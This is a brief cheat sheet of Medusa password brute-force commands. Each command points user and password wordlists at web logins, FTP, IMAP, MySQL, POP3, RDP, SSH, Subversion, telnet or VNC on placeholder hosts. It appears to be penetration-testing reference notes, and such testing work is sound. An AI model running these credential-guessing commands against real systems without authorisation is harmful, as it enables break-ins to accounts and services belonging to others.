# medusa usages


**Web Form**
```bash
medusa -M web-form -h www.example.com -U users.txt -P passwords.txt -m FORM:"username=^USER^&password=^PASS^:F=Invalid"
```

**HTTP**
```bash
medusa -M http -h www.example.com -U users.txt -P passwords.txt -m DIR:/login.php -m FORM:username=^USER^&password=^PASS^

# yada
medusa -H web_servers.txt -U usernames.txt -P passwords.txt -M http -m GET
```

**FTP**
```bash
medusa -M ftp -h 192.168.1.100 -u admin -P passwords.txt
```

**IMAP**
```bash
medusa -M imap -h mail.example.com -U users.txt -P passwords.txt
```
**MySQL**
```bash
medusa -M mysql -h 192.168.1.100 -u root -P passwords.txt
```

**POP3**
```bash
medusa -M pop3 -h mail.example.com -U users.txt -P passwords.txt
```

**RDP**
```bash
medusa -M rdp -h 192.168.1.100 -u admin -P passwords.txt
```

**SSHv2**
```bash
medusa -M ssh -h 192.168.1.100 -u root -P passwords.txt
```

**Subversion**
```bash
medusa -M svn -h 192.168.1.100 -u admin -P passwords.txt
```
**telnet**
```bash
medusa -M telnet -h 192.168.1.100 -u admin -P passwords.txt
```

**vnc**
```bash
medusa -M vnc -h 192.168.1.100 -P passwords.txt
```





